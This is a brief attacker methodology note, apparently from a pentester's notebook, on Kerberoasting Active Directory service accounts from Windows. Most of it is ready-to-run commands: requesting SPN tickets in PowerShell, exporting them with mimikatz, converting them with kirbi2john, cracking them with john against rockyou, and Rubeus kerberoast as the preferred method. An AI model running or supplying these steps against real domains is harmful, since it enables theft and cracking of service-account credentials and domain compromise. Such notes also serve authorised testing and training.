<https://github.com/nidem/kerberoast>
<https://www.youtube.com/watch?v=beRDcvBwTBw> (kerberoast on windows)

<https://attack.stealthbits.com/>

powershell -c .\GetUserSPNs.ps1

(need to be in powershell for these commands)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “MSSQLSvc/xor-app23.xor.com:1433”

then:

.\mimikatz.exe
kerberos::list /export

/opt/tools/kerberoast

copy kirbi2john.py and kerberos.py to new folder with all kirbi hashes
Convert kirbi dump to hash for john:
python3 kirbi2john.py *.kirbi -o MSSQLSvc.txt

john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

<https://github.com/r3motecontrol/Ghostpack-CompiledBinaries>
<https://specterops.gitbook.io/ghostpack/rubeus/introduction/command-line-usage>
# Preferred method:

.\Rubeus.exe kerberoast /outfile:hashes.txt
then copy to kali.. if any hash contain an “:” then try removing it if it fails cracking it...

.\Rubeus.exe kerberoast /outfile:hashes.txt

![unnamed_5a43f2509cd147f19f234a9d482a5546](docs/Attachments/_Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Active%20Directory%20Methdology/Attacks/Kerberoast/On%20Windows/{{notename}}-202605011742.png)
